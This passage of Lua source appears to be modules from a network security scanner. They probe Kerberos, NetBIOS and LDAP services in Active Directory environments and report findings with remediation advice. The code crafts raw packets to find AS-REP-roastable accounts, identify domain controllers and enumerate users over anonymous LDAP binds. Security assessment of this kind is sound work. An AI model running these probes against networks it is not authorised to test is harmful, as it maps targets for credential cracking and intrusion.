local function der_generalstring(s)
  return der_tag(0x1B, s)   -- GeneralString
end

local function der_utf8string(s)
  return der_tag(0x0C, s)   -- UTF8String
end

local function der_sequence(content)
  return der_tag(0x30, content)
end

local function der_context(n, content)
  -- Context-specific constructed tag [n]
  return der_tag(0xA0 + n, content)
end

--- Build a KRB5 AS-REQ for a given username and realm.
-- This is a bare-minimum request with no pre-auth data.
-- Returns raw bytes.
local function krb5_build_as_req(username, realm)
  -- PrincipalName: name-type = 1 (NT-PRINCIPAL), name-string = [username]
  local principal_name = der_sequence(
    der_context(0, der_integer(1)) ..   -- name-type = NT-PRINCIPAL
    der_context(1, der_sequence(        -- name-string
      der_generalstring(username)
    ))
  )

  -- KDC-REQ-BODY
  -- kdc-options: empty flags (0)
  local kdc_options = der_context(0,
    der_tag(0x03,  -- BIT STRING
      "\x00\x00\x00\x00\x00"   -- 5 bytes = 40 bits, all zero
    )
  )

  local cname = der_context(1, principal_name)

  -- realm (server realm)
  local realm_field = der_context(2, der_generalstring(realm))

  -- sname: krbtgt/<realm>
  local sname = der_context(3, der_sequence(
    der_context(0, der_integer(2)) ..   -- NT-SRV-INST
    der_context(1, der_sequence(
      der_generalstring("krbtgt") ..
      der_generalstring(realm)
    ))
  ))

  -- till: far-future expiry (20370913024805Z)
  local till = der_context(5,
    der_tag(0x18, "20370913024805Z")    -- GeneralizedTime
  )

  -- nonce: random 32-bit value
  local nonce = der_context(7, der_integer(math.random(1, 2147483647)))

  -- etype: [18, 17, 23, 3, 1] (AES256, AES128, RC4-HMAC, DES-CBC-MD5, DES-CBC-CRC)
  local etype = der_context(8, der_sequence(
    der_integer(18) .. der_integer(17) ..
    der_integer(23) .. der_integer(3)  .. der_integer(1)
  ))

  local req_body = der_sequence(
    kdc_options .. cname .. realm_field .. sname .. till .. nonce .. etype
  )

  -- KDC-REQ: pvno=5, msg-type=10 (AS-REQ), req-body
  local kdc_req = der_sequence(
    der_context(1, der_integer(KRB5_PVNO))   ..
    der_context(2, der_integer(KRB5_MSG_AS_REQ)) ..
    der_context(4, req_body)
  )

  -- APPLICATION tag [1] IMPLICIT (AS-REQ application wrapper)
  local as_req = der_tag(0x6A, kdc_req:sub(2))  -- strip outer SEQUENCE tag, wrap in APP[1]

  -- TCP Kerberos: 4-byte big-endian length prefix
  local pkt_len = #as_req
  return string.char(
    math.floor(pkt_len / 16777216) % 256,
    math.floor(pkt_len / 65536)    % 256,
    math.floor(pkt_len / 256)      % 256,
    pkt_len % 256
  ) .. as_req
end

--- Parse the message type and error code from a raw Kerberos response.
-- Returns table: { msg_type, error_code, realm, ctime }
-- msg_type: 11=AS-REP (success), 30=KRB-ERROR
local function krb5_parse_response(data)
  if not data or #data < 8 then return nil end

  -- Strip 4-byte TCP length prefix
  local pos = 5
  local payload = data:sub(pos)

  -- Look for APPLICATION tag: 0x6B = AS-REP app[11], 0x7E = KRB-ERROR app[30]
  -- or equivalently 0x6A = AS-REQ (echo), 0x30 = SEQUENCE
  local app_tag = payload:byte(1)
  local msg_type
  if app_tag == 0x6B then
    msg_type = KRB5_MSG_AS_REP
  elseif app_tag == 0x7E then
    msg_type = KRB5_MSG_KRB_ERROR
  else
    -- Try to find msg-type in the DER structure by scanning for context [2]
    -- containing an integer
    msg_type = 0
  end

  -- Extract error-code: in KRB-ERROR the error-code is context [6]
  -- We do a simple scan for the pattern: A6 03 02 01 <byte>
  local error_code = nil
  for i = 1, #payload - 4 do
    if payload:byte(i)   == 0xA6 and   -- context [6]
       payload:byte(i+1) == 0x03 and   -- length 3
       payload:byte(i+2) == 0x02 and   -- INTEGER tag
       payload:byte(i+3) == 0x01 then  -- length 1
      error_code = payload:byte(i+4)
      break
    end
  end

  -- Extract realm: look for GeneralString (0x1B) sequences
  local realm = nil
  for i = 1, #payload - 2 do
    if payload:byte(i) == 0x1B then
      local slen = payload:byte(i+1)
      if slen > 0 and slen < 64 and i + 1 + slen <= #payload then
        local candidate = payload:sub(i+2, i+1+slen)
        -- Realm names are uppercase ASCII
        if candidate:match("^[A-Z][A-Z0-9%.%-]+$") then
          realm = candidate
          break
        end
      end
    end
  end

  return {
    msg_type   = msg_type,
    error_code = error_code,
    realm      = realm,
  }
end

-- Main Kerberos module
register_module("kerberos", function(ctx)
  local host_ip  = ctx.target_ip
  local port_num = ctx.port_number
  local timeout  = ctx.config.timeout
  local agg      = ctx.config.aggression

  -- ---- [P1] KDC reachability + realm discovery -------------------------
  -- Use a clearly invalid username so we only ever get KRB-ERROR back
  local probe_user  = "reko_probe_" .. tostring(os.time() % 10000)
  local probe_realm = "UNKNOWN.LOCAL"   -- will be corrected from error response

  local as_req_pkt = krb5_build_as_req(probe_user, probe_realm)
  local sd, conn_err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "kerberos", "Cannot connect: " .. conn_err)
    return
  end

  local ok, serr = sock_send(sd, as_req_pkt)
  if not ok then
    log_warn(ctx, "kerberos", "AS-REQ send failed: " .. serr)
    sock_close(sd)
    return
  end

  -- Read response (up to 8 KB)
  local resp_data = ""
  for _ = 1, 16 do
    local status, chunk = sd:receive()
    if not status then break end
    resp_data = resp_data .. chunk
    if #resp_data >= 2048 then break end
  end
  sock_close(sd)

  if #resp_data < 8 then
    log_warn(ctx, "kerberos", "No valid response received")
    return
  end

  local parsed = krb5_parse_response(resp_data)
  if not parsed then
    log_warn(ctx, "kerberos", "Could not parse Kerberos response")
    return
  end

  log_info(ctx, "kerberos", string.format(
    "Response: msg_type=%d error_code=%s realm=%s",
    parsed.msg_type or 0,
    tostring(parsed.error_code),
    parsed.realm or "?"
  ))

  -- If we got ANY valid Kerberos response, the KDC is confirmed active
  local discovered_realm = parsed.realm or "UNKNOWN"

  ctx:add_finding(
    "Kerberos KDC confirmed active — realm: " .. discovered_realm,
    "A Kerberos Key Distribution Center responded to our AS-REQ probe. "
    .. "The realm name is disclosed in the error response without authentication. "
    .. "This confirms an Active Directory domain is present and reveals the "
    .. "Kerberos realm name, which is essential for further AD attacks.",
    {
      realm          = discovered_realm,
      kdc_port       = tostring(port_num),
      response_type  = parsed.msg_type == KRB5_MSG_AS_REP and "AS-REP (no pre-auth!)"
                       or "KRB-ERROR (expected)",
      error_code     = tostring(parsed.error_code or "?"),
    },
    0.95, 0.25
  )

  -- ---- [P2] Pre-authentication not required (general) -------------------
  -- If we got an AS-REP (msg_type=11) for our invalid probe user,
  -- the KDC is configured without pre-auth requirement globally — very rare
  -- but extremely severe.
  if parsed.msg_type == KRB5_MSG_AS_REP then
    ctx:add_finding(
      "Kerberos AS-REP returned WITHOUT pre-authentication (CRITICAL)",
      "The KDC returned a full AS-REP ticket for an unauthenticated AS-REQ. "
      .. "Pre-authentication is not required globally on this KDC. "
      .. "Any user account can have their encrypted TGT requested and "
      .. "subjected to offline password cracking (AS-REP Roasting).",
      {
        realm       = discovered_realm,
        probe_user  = probe_user,
        remediation = "Enable pre-authentication requirement for all accounts. "
                      .. "PowerShell: Get-ADUser -Filter * -Properties DoesNotRequirePreAuth "
                      .. "| Where-Object {$_.DoesNotRequirePreAuth} | "
                      .. "Set-ADAccountControl -DoesNotRequirePreAuth $false",
      },
      0.99, 0.90
    )
  end

  -- ---- [A1] AS-REP Roasting — probe common service accounts -------------
  if agg < 1 then return end

  log_info(ctx, "kerberos", "Probing " .. #KERBEROS_ROAST_USERS .. " accounts for AS-REP roasting")

  local roastable = {}
  for _, username in ipairs(KERBEROS_ROAST_USERS) do
    local req = krb5_build_as_req(username, discovered_realm)
    local sd2, _ = tcp_connect(host_ip, port_num, timeout)
    if sd2 then
      sock_send(sd2, req)
      local rdata = ""
      for _ = 1, 8 do
        local st, ch = sd2:receive()
        if not st then break end
        rdata = rdata .. ch
        if #rdata >= 1024 then break end
      end
      sock_close(sd2)

      if #rdata >= 8 then
        local r = krb5_parse_response(rdata)
        if r and r.msg_type == KRB5_MSG_AS_REP then
          -- AS-REP returned without pre-auth → roastable
          table.insert(roastable, username)
          log_warn(ctx, "kerberos", "AS-REP Roastable account: " .. username)
        elseif r and r.error_code == KRB5_ERR_CLIENT_NOT_FOUND then
          log_info(ctx, "kerberos", username .. ": not found (expected)")
        elseif r and r.error_code == KRB5_ERR_PREAUTH_REQUIRED then
          log_info(ctx, "kerberos", username .. ": exists, pre-auth required (secure)")
        end
      end
    end
  end

  if #roastable > 0 then
    ctx:add_finding(
      string.format("AS-REP Roastable accounts found: %d account(s) (CRITICAL)", #roastable),
      "The following accounts have 'Do not require Kerberos preauthentication' "
      .. "set (UF_DONT_REQUIRE_PREAUTH). An attacker can request encrypted TGTs "
      .. "for these accounts without knowing their password, then crack the "
      .. "encryption offline using hashcat or john. Common tool: GetNPUsers.py "
      .. "(Impacket) or Rubeus asreproast.",
      {
        roastable_accounts = table.concat(roastable, ", "),
        realm              = discovered_realm,
        remediation        = "For each account: Set-ADAccountControl "
                             .. "-Identity <user> -DoesNotRequirePreAuth $false. "
                             .. "Also enforce strong passwords for service accounts.",
      },
      0.99, 0.85
    )
  end
end)


-- ===========================================================================
-- NETBIOS-NS MODULE  (port 137/udp)
-- ===========================================================================
-- NetBIOS Name Service resolves NetBIOS names to IP addresses — the Windows
-- pre-DNS naming layer. Even on modern networks it reveals computer names,
-- domain membership, and service registrations.
--
-- Checks performed (passive only — UDP query is safe):
--    [P1] NetBIOS name table query (NBSTAT): retrieve all registered names
--         for the target, including computer name, domain, and services
--    [P2] Domain controller identification: look for the <1C> group name
--         (domain controller registration) and <1B> domain master browser
--    [P3] Name type interpretation: decode the 16-byte NetBIOS name suffix
--         to identify what services are running
--
--  Scoring:
--    DC identified via NetBIOS     → confidence 0.90, impact 0.50 → HIGH
--    Names disclosed (any)         → confidence 0.95, impact 0.30 → MEDIUM
-- ===========================================================================

-- NetBIOS name suffixes and their meanings
local NETBIOS_SUFFIXES = {
  [0x00] = "Workstation service",
  [0x01] = "Messenger service",
  [0x03] = "Messenger service (user)",
  [0x06] = "RAS server service",
  [0x1B] = "Domain Master Browser",
  [0x1C] = "Domain Controller (group)",
  [0x1D] = "Master Browser",
  [0x1E] = "Browser Service Elections",
  [0x1F] = "Net DDE service",
  [0x20] = "File Server service",
  [0x21] = "RAS client service",
  [0xBE] = "Network Monitor agent",
  [0xBF] = "Network Monitor application",
}

--- Encode a NetBIOS name in the first-level encoding used in NBSTAT packets.
-- NetBIOS names are padded to 15 bytes + 1 suffix byte, then each byte
-- is encoded as two ASCII chars: each nibble → 'A' + nibble.
local function netbios_encode_name(name, suffix)
  -- Pad name to 15 bytes
  local padded = name:upper()
  while #padded < 15 do padded = padded .. " " end
  padded = padded:sub(1, 15) .. string.char(suffix or 0x00)

  local encoded = ""
  for i = 1, #padded do
    local b = padded:byte(i)
    encoded = encoded
      .. string.char(0x41 + math.floor(b / 16))   -- high nibble
      .. string.char(0x41 + (b % 16))              -- low nibble
  end
  return encoded  -- 32 bytes
end

--- Build a NetBIOS NBSTAT (Node Status Request) UDP packet.
-- This queries for ALL names registered by the target.
-- Transaction ID is random; question type = NBSTAT (0x0021).
local function nbns_build_nbstat()
  local txid = math.random(0, 65535)

  -- Header: TXID FLAGS QDCOUNT ANCOUNT NSCOUNT ARCOUNT
  -- Flags: 0x0000 (standard query)
  local header = string.char(
    math.floor(txid/256), txid%256,   -- Transaction ID
    0x00, 0x00,                        -- Flags: query, not recursive
    0x00, 0x01,                        -- QDCOUNT = 1
    0x00, 0x00,                        -- ANCOUNT = 0
    0x00, 0x00,                        -- NSCOUNT = 0
    0x00, 0x00                         -- ARCOUNT = 0
  )

  -- Question: wildcard name "*" + null padding, NBSTAT type
  -- The wildcard is encoded as first-level encoded "*" (0x2A) padded
  -- QNAME length = 0x20 (32 bytes encoded name)
  local wildcard_encoded = netbios_encode_name("*", 0x00)
  local question = string.char(0x20)  -- length = 32
    .. wildcard_encoded
    .. string.char(0x00)              -- root label
    .. string.char(0x00, 0x21)       -- QTYPE = NBSTAT (0x0021)
    .. string.char(0x00, 0x01)       -- QCLASS = IN

  return header .. question
end

--- Parse an NBSTAT response and return the name table.
-- Returns list of { name, suffix, suffix_desc, flags }
local function nbns_parse_response(data)
  if not data or #data < 57 then return nil end

  -- Skip header (12 bytes) + question section
  -- Answer section starts after: header(12) + qname(34) + qtype(2) + qclass(2) = 50
  -- Then: name(34) + type(2) + class(2) + ttl(4) + rdlength(2) = 44 bytes before rdata
  -- rdata starts with NUM_NAMES (1 byte)

  local rdata_start = 57   -- approximate; adjust based on actual parsing
  -- More robustly: find the NBSTAT answer by scanning for 0x00 0x21 (NBSTAT type)
  local nbstat_pos = nil
  for i = 13, #data - 5 do
    if data:byte(i) == 0x00 and data:byte(i+1) == 0x21 then
      nbstat_pos = i + 2  -- after QTYPE
      break
    end
  end

  if not nbstat_pos then
    -- Fallback to fixed offset
    nbstat_pos = 57
  end

  -- Skip: CLASS(2) + TTL(4) + RDLENGTH(2) = 8 bytes
  local names_start = nbstat_pos + 8
  if names_start > #data then return nil end

  local num_names = data:byte(names_start)
  if not num_names or num_names == 0 or num_names > 64 then return nil end

  local names = {}
  local pos = names_start + 1
  for _ = 1, num_names do
    if pos + 17 > #data then break end
    -- Each entry: NAME(15 bytes) + SUFFIX(1 byte) + FLAGS(2 bytes)
    local raw_name = data:sub(pos, pos + 14)
    local suffix   = data:byte(pos + 15)
    local flags_hi = data:byte(pos + 16)
    local flags_lo = data:byte(pos + 17)
    local flags    = flags_hi * 256 + (flags_lo or 0)
    pos = pos + 18

    -- Trim trailing spaces from name
    local name = trim(raw_name)
    local suffix_desc = NETBIOS_SUFFIXES[suffix] or string.format("Unknown (0x%02X)", suffix)
    local is_group = (flags % 32768 >= 16384)  -- Group bit = bit 15 of flags... (bit 7 of flags_hi)

    table.insert(names, {
      name        = name,
      suffix      = suffix,
      suffix_desc = suffix_desc,
      flags       = flags,
      is_group    = is_group,
    })
  end
  return names
end

-- Main NetBIOS-NS module
register_module("netbios_ns", function(ctx)
  local host_ip  = ctx.target_ip
  local port_num = ctx.port_number   -- 137/udp
  local timeout  = ctx.config.timeout

  -- Send NBSTAT query via UDP
  local nbstat_pkt = nbns_build_nbstat()
  local udp_sd = nmap.new_socket("udp")
  udp_sd:set_timeout(timeout)

  local ok, serr = udp_sd:sendto(host_ip, port_num, nbstat_pkt)
  if not ok then
    log_warn(ctx, "netbios_ns", "NBSTAT send failed: " .. tostring(serr))
    sock_close(udp_sd)
    return
  end

  local status, resp_data = udp_sd:receive()
  sock_close(udp_sd)

  if not status or not resp_data then
    log_info(ctx, "netbios_ns", "No NBSTAT response (host may not have NetBIOS enabled)")
    return
  end

  local names = nbns_parse_response(resp_data)
  if not names or #names == 0 then
    log_warn(ctx, "netbios_ns", "NBSTAT response received but could not parse names")
    return
  end

  log_info(ctx, "netbios_ns", string.format("NBSTAT: %d names in table", #names))

  -- Build a readable name table for evidence
  local name_lines   = {}
  local computer_name = nil
  local domain_name   = nil
  local is_dc         = false
  local is_master_browser = false

  for _, n in ipairs(names) do
    table.insert(name_lines, string.format(
      "%-16s [%02X] %-30s %s",
      n.name, n.suffix, n.suffix_desc,
      n.is_group and "(GROUP)" or "(UNIQUE)"
    ))

    -- Identify key roles
    if n.suffix == 0x00 and not n.is_group then
      computer_name = n.name  -- workstation/computer name
    end
    if n.suffix == 0x00 and n.is_group then
      domain_name = n.name    -- domain or workgroup name
    end
    if n.suffix == 0x1C then
      is_dc = true            -- domain controller group name
    end
    if n.suffix == 0x1B then
      is_master_browser = true
    end
  end

  -- Core finding: names disclosed
  ctx:add_finding(
    string.format("NetBIOS name table exposed (%d entries) — computer: %s",
      #names, computer_name or "unknown"),
    "The NetBIOS Name Service (port 137/UDP) responded with the full name "
    .. "table for this host. NetBIOS names reveal the computer name, domain "
    .. "membership, and registered services without authentication.",
    {
      computer_name  = computer_name or "not identified",
      domain         = domain_name   or "not identified",
      name_count     = tostring(#names),
      name_table     = table.concat(name_lines, "\n"),
      remediation    = "Disable NetBIOS over TCP/IP if not required: "
                       .. "Network adapter → IPv4 properties → Advanced → WINS "
                       .. "→ Disable NetBIOS over TCP/IP",
    },
    0.95, 0.30
  )

  -- Domain controller identification
  if is_dc then
    ctx:add_finding(
      "NetBIOS identifies this host as a DOMAIN CONTROLLER",
      "The <1C> group name registration in the NetBIOS name table indicates "
      .. "this host is a Domain Controller for domain '" .. (domain_name or "?") .. "'. "
      .. "Domain Controllers are the highest-value targets in an Active Directory "
      .. "environment — compromise means full domain compromise.",
      {
        domain          = domain_name or "unknown",
        computer_name   = computer_name or "unknown",
        dc_indicator    = "<1C> group name present",
        remediation     = "Ensure DC is patched, monitored, and network-segmented. "
                          .. "Disable NetBIOS if not required for legacy apps.",
      },
      0.90, 0.50
    )
    log_warn(ctx, "netbios_ns", "DOMAIN CONTROLLER identified: " .. (computer_name or "?"))
  end

  if is_master_browser then
    ctx:add_finding(
      "NetBIOS Master Browser role active on this host",
      "The <1B> unique name indicates this host holds the Master Browser role, "
      .. "meaning it maintains a list of all machines in the workgroup/domain. "
      .. "This makes it a high-information target for network enumeration.",
      {
        computer_name = computer_name or "unknown",
        domain        = domain_name   or "unknown",
      },
      0.90, 0.35
    )
  end
end)


end  



do  -- scope block: keeps locals under Lua 5.1's 200-variable limit

-- ===========================================================================
-- LDAP MODULE  (ports 389/tcp and 3268/tcp — Global Catalog)
-- ===========================================================================
-- LDAP is the directory protocol behind Active Directory. An anonymous bind
-- reveals the entire directory structure, user accounts, groups, and
-- password policies without credentials.
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] Anonymous bind attempt: send a BindRequest with empty credentials
--         A successful bind means unauthenticated LDAP access is permitted
--    [P2] Root DSE query: query for namingContexts, defaultNamingContext,
--         serverName, supportedLDAPVersion, supportedSASLMechanisms
--         This reveals the base DN, AD forest/domain structure, and
--         supported authentication methods
--    [P3] LDAP version and server software identification
--
--  AGG 1 – safe-active:
--    [A1] Base DN object enumeration: query the defaultNamingContext for
--         top-level OUs, containers, and object counts
--    [A2] User account enumeration: search for (objectClass=user) objects,
--         record count and sample CNs (no passwords or sensitive attrs)
--    [A3] Password policy query: extract the default domain password policy
--         (minPwdLength, lockoutThreshold, pwdHistoryLength)
--
--  Scoring:
--    Anonymous bind succeeds            → confidence 0.99, impact 0.80 → CRITICAL
--    User accounts enumerable anon      → confidence 0.99, impact 0.85 → CRITICAL
--    Weak password policy exposed       → confidence 0.95, impact 0.70 → HIGH
--    Root DSE info disclosed            → confidence 0.95, impact 0.35 → MEDIUM
--    SASL mechanisms disclosed          → confidence 0.90, impact 0.20 → LOW
-- ===========================================================================

-- LDAP BER/DER encoding helpers (minimal, specific to what we need)
-- LDAP messages are BER-encoded (Basic Encoding Rules)

local LDAP_OP_BIND_REQUEST   = 0x60   -- APPLICATION 0 CONSTRUCTED
local LDAP_OP_BIND_RESPONSE  = 0x61   -- APPLICATION 1 CONSTRUCTED
local LDAP_OP_SEARCH_REQUEST = 0x63   -- APPLICATION 3 CONSTRUCTED
local LDAP_OP_SEARCH_ENTRY   = 0x64   -- APPLICATION 4 CONSTRUCTED
local LDAP_OP_SEARCH_DONE    = 0x65   -- APPLICATION 5 CONSTRUCTED

-- BER length encoding
local function ber_length(n)
  if n < 128 then
    return string.char(n)
  elseif n < 256 then
    return string.char(0x81, n)
  else
    return string.char(0x82, math.floor(n/256), n%256)
  end
end

local function ber_tag(tag, content)
  return string.char(tag) .. ber_length(#content) .. content
end

local function ber_integer(n)
  if n < 128 then
    return ber_tag(0x02, string.char(n))
  else
    return ber_tag(0x02, string.char(0x00, n))
  end
end

local function ber_octetstring(s)
  return ber_tag(0x04, s or "")
end

local function ber_sequence(content)
  return ber_tag(0x30, content)
end

local function ber_enum(n)
  return ber_tag(0x0A, string.char(n))
end

-- LDAP message wrapper: Sequence { messageID, protocolOp }
local function ldap_message(msg_id, op)
  return ber_sequence(ber_integer(msg_id) .. op)
end

--- Build an LDAP anonymous BindRequest (LDAPv3).
-- Simple auth with empty DN and empty password = anonymous bind.
local function ldap_build_anon_bind(msg_id)
  -- BindRequest ::= [APPLICATION 0] {
  --   version     INTEGER (1..127),
  --   name        LDAPDN,
  --   authentication  AuthenticationChoice }
  -- Simple authentication: [0] IMPLICIT OCTET STRING (password)
  local bind_req = ber_tag(LDAP_OP_BIND_REQUEST,
    ber_integer(3) ..          -- version = 3
    ber_octetstring("") ..     -- name = "" (anonymous)
    ber_tag(0x80, "")          -- simple auth, empty password
  )
  return ldap_message(msg_id, bind_req)
end

--- Build an LDAP Search request for the Root DSE.
-- Base = "", scope = baseObject (0), filter = (objectClass=*)
local function ldap_build_root_dse_search(msg_id)
  -- Attributes to request
  local attrs = ber_sequence(
    ber_octetstring("namingContexts") ..
    ber_octetstring("defaultNamingContext") ..
    ber_octetstring("serverName") ..
    ber_octetstring("supportedLDAPVersion") ..
    ber_octetstring("supportedSASLMechanisms") ..
    ber_octetstring("dnsHostName") ..
    ber_octetstring("ldapServiceName")
  )

  -- Filter: (objectClass=*) = present filter [7] "objectClass"
  local filter = ber_tag(0x87, "objectClass")  -- present filter

  local search_req = ber_tag(LDAP_OP_SEARCH_REQUEST,
    ber_octetstring("") ..     -- base DN = "" (Root DSE)
    ber_enum(0) ..             -- scope = baseObject
    ber_enum(0) ..             -- derefAliases = neverDerefAliases
    ber_integer(0) ..          -- sizeLimit = 0 (unlimited)
    ber_integer(10) ..         -- timeLimit = 10 seconds
    ber_tag(0x01, "\x00") ..   -- typesOnly = FALSE
    filter ..
    attrs
  )
  return ldap_message(msg_id, search_req)
end

--- Build an LDAP Search for user objects under a base DN.
local function ldap_build_user_search(msg_id, base_dn)
  local attrs = ber_sequence(
    ber_octetstring("cn") ..
    ber_octetstring("sAMAccountName") ..
    ber_octetstring("userPrincipalName") ..
    ber_octetstring("userAccountControl")
  )

  -- Filter: (&(objectClass=user)(objectCategory=person))
  -- Simplified: (objectClass=user) = equalityMatch [3]
  local filter = ber_tag(0xA3,   -- equalityMatch [3] CONSTRUCTED
    ber_octetstring("objectClass") ..
    ber_octetstring("user")
  )

  local search_req = ber_tag(LDAP_OP_SEARCH_REQUEST,
    ber_octetstring(base_dn) ..
    ber_enum(2) ..             -- scope = wholeSubtree
    ber_enum(0) ..
    ber_integer(20) ..         -- sizeLimit = 20 (just a sample)
    ber_integer(10) ..
    ber_tag(0x01, "\x00") ..
    filter ..
    attrs
  )
  return ldap_message(msg_id, search_req)
end

--- Read one complete LDAP BER message from a socket.
-- Returns (raw_bytes, nil) or (nil, error)
local function ldap_read_message(sd)
  -- Read tag + length header
  local status, hdr = sd:receive_bytes(2)
  if not status or #hdr < 2 then
    return nil, "header read failed"
  end

  local tag = hdr:byte(1)
  local len_byte = hdr:byte(2)
  local content_len

  if len_byte < 128 then
    content_len = len_byte
  elseif len_byte == 0x81 then
    local st2, lb = sd:receive_bytes(1)
    if not st2 then return nil, "length byte read failed" end
    content_len = lb:byte(1)
  elseif len_byte == 0x82 then
    local st2, lb = sd:receive_bytes(2)
    if not st2 then return nil, "length bytes read failed" end
    content_len = lb:byte(1) * 256 + lb:byte(2)
  else
    return nil, "unsupported length encoding"
  end

  if content_len > 65536 then return nil, "message too large" end

  local st3, body = sd:receive_bytes(content_len)
  if not st3 then return nil, "body read failed" end

  return hdr .. body, nil
end

--- Parse result code from an LDAP BindResponse or SearchResultDone.
-- Result code is the first integer in the response body.
-- Returns result_code (0 = success) or nil
local function ldap_parse_result_code(msg)
  if not msg or #msg < 7 then return nil end
  -- Find the enumerated result code: tag 0x0A, length 0x01, value
  for i = 1, #msg - 2 do
    if msg:byte(i) == 0x0A and msg:byte(i+1) == 0x01 then
      return msg:byte(i+2)
    end
  end
  return nil
end

--- Extract string values from LDAP SearchResultEntry attribute values.
-- Returns table of { attr_name, values[] } pairs.
local function ldap_parse_search_entry(msg)
  if not msg or #msg < 10 then return {} end

  local attrs = {}
  local pos = 1

  -- Skip outer SEQUENCE tag+length (message wrapper)
  -- We scan for OCTET STRINGs and collect them
  -- Simple approach: find all 0x04 (OCTET STRING) tags and extract values
  while pos <= #msg - 2 do
    if msg:byte(pos) == 0x04 then
      local slen = msg:byte(pos+1)
      if slen < 128 and pos + 1 + slen <= #msg then
        local s = msg:sub(pos+2, pos+1+slen)
        -- Only collect printable strings
        if s:match("^[%w%.%-%_@=, ]+$") then
          table.insert(attrs, s)
        end
        pos = pos + 2 + slen
      else
        pos = pos + 1
      end
    else
      pos = pos + 1
    end
  end
  return attrs
end

-- Main LDAP module
register_module("ldap", function(ctx)
  local host_ip  = ctx.target_ip
  local port_num = ctx.port_number
  local timeout  = ctx.config.timeout
  local agg      = ctx.config.aggression

  local sd, err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "ldap", "Cannot connect: " .. err)
    return
  end

  -- ---- [P1] Anonymous bind ---------------------------------------------
  local bind_pkt = ldap_build_anon_bind(1)
  local ok, serr = sock_send(sd, bind_pkt)
  if not ok then
    log_warn(ctx, "ldap", "Bind send failed: " .. serr)
    sock_close(sd)
    return
  end

  local bind_resp, rerr = ldap_read_message(sd)
  if not bind_resp then
    log_warn(ctx, "ldap", "Bind response read failed: " .. (rerr or ""))
    sock_close(sd)
    return
  end

  local result_code = ldap_parse_result_code(bind_resp)
  log_info(ctx, "ldap", "Anonymous bind result code: " .. tostring(result_code))

  if result_code ~= 0 then
    -- Bind failed — record info and exit
    ctx:add_finding(
      "LDAP anonymous bind refused (good configuration)",
      "The LDAP server rejected an anonymous bind request. "
      .. "Unauthenticated enumeration is not permitted.",
      { result_code = tostring(result_code) },
      0.90, 0.05
    )
    sock_close(sd)
    return
  end

  -- Anonymous bind succeeded
  ctx:add_finding(
    "LDAP anonymous bind permitted (CRITICAL in AD environments)",
    "The LDAP server accepted an anonymous (unauthenticated) bind. "
    .. "In an Active Directory environment this allows any unauthenticated "
    .. "host to query user accounts, group memberships, password policies, "
    .. "and organisational structure from the directory.",
    {
      port        = tostring(port_num),
      bind_type   = "anonymous (empty DN + empty password)",
      remediation = "Disable anonymous LDAP access: "
                    .. "AD: deny anonymous LDAP operations via GPO "
                    .. "'Network access: Do not allow anonymous enumeration of SAM accounts and shares'; "
                    .. "OpenLDAP: set 'disallow bind_anon' in slapd.conf",
    },
    0.99, 0.80
  )

  -- ---- [P2] Root DSE query ---------------------------------------------
  local dse_pkt = ldap_build_root_dse_search(2)
  sock_send(sd, dse_pkt)

  -- Read search entry + done responses
  local base_dn       = nil
  local sasl_mechs    = {}
  local ldap_versions = {}
  local dns_hostname  = nil
  local all_values    = {}

  for _ = 1, 10 do
    local msg, merr = ldap_read_message(sd)
    if not msg then break end

    -- Check if this is a SearchResultDone (tag 0x65 inside sequence)
    if msg:find(string.char(LDAP_OP_SEARCH_DONE), 1, true) then break end

    local vals = ldap_parse_search_entry(msg)
    for _, v in ipairs(vals) do
      table.insert(all_values, v)
      -- Heuristic classification
      if v:match("^DC=") then
        base_dn = base_dn or v
      elseif v:match("^[A-Z]+$") and #v > 3 then
        -- Likely a SASL mechanism (GSSAPI, NTLM, DIGEST-MD5, etc.)
        table.insert(sasl_mechs, v)
      elseif v:match("^%d+$") then
        table.insert(ldap_versions, v)
      elseif v:match("%.[a-z]+%.[a-z]+$") then
        dns_hostname = dns_hostname or v
      end
    end
  end

  if #all_values > 0 then
    ctx:add_finding(
      "LDAP Root DSE information disclosed",
      "The Root DSE query returned directory metadata including the base DN, "
      .. "supported LDAP versions, SASL mechanisms, and server hostname. "
      .. "This information maps the directory structure for further enumeration.",
      {
        base_dn          = base_dn        or "not identified",
        dns_hostname     = dns_hostname   or "not disclosed",
        sasl_mechanisms  = #sasl_mechs > 0 and table.concat(sasl_mechs, ", ") or "none disclosed",
        ldap_versions    = #ldap_versions > 0 and table.concat(ldap_versions, ", ") or "not disclosed",
        all_values       = table.concat(all_values, " | "),
      },
      0.95, 0.35
    )
    log_info(ctx, "ldap", "Root DSE base_dn=" .. (base_dn or "?") ..
      " sasl=" .. table.concat(sasl_mechs, ","))
  end

  -- ---- Active checks (aggression >= 1) ----------------------------------
  if agg < 1 or not base_dn then
    sock_close(sd)
    return
  end

  -- ---- [A1] User object enumeration ------------------------------------
  local user_pkt = ldap_build_user_search(3, base_dn)
  sock_send(sd, user_pkt)

  local users_found = {}
  for _ = 1, 30 do
    local msg, _ = ldap_read_message(sd)
    if not msg then break end
    if msg:find(string.char(LDAP_OP_SEARCH_DONE), 1, true) then break end

    local vals = ldap_parse_search_entry(msg)
    for _, v in ipairs(vals) do
      -- sAMAccountName values are typically short alphanumeric
      if v:match("^[%w%.%-_]+$") and #v >= 2 and #v <= 20 then
        table.insert(users_found, v)
      end
    end
  end

  -- Deduplicate
  local seen = {}
  local unique_users = {}
  for _, u in ipairs(users_found) do
    if not seen[u] then seen[u] = true; table.insert(unique_users, u) end
  end

  if #unique_users > 0 then
    local sample = {}
    for i = 1, math.min(10, #unique_users) do
      table.insert(sample, unique_users[i])
    end
    ctx:add_finding(
      string.format("LDAP user enumeration via anonymous bind (%d accounts sampled)", #unique_users),
      "User accounts were enumerated from Active Directory via an anonymous "
      .. "LDAP search. Exposed account names enable targeted password spraying, "
      .. "Kerberoasting, and social engineering attacks.",
      {
        sample_accounts = table.concat(sample, ", "),
        total_sampled   = tostring(#unique_users),
        base_dn         = base_dn,
        remediation     = "Disable anonymous LDAP bind and restrict "
                          .. "LDAP queries to authenticated service accounts only",
      },
      0.99, 0.85
    )
  end

  sock_close(sd)
end)


-- ===========================================================================
-- SNMP MODULE  (port 161/udp)
-- ===========================================================================
-- SNMP exposes a detailed map of a device's interfaces, running processes,
-- installed software, and network routing — all behind a single "community
-- string" that defaults to "public" on most devices.
--
-- Checks performed:
--
--  AGG 0 – passive:
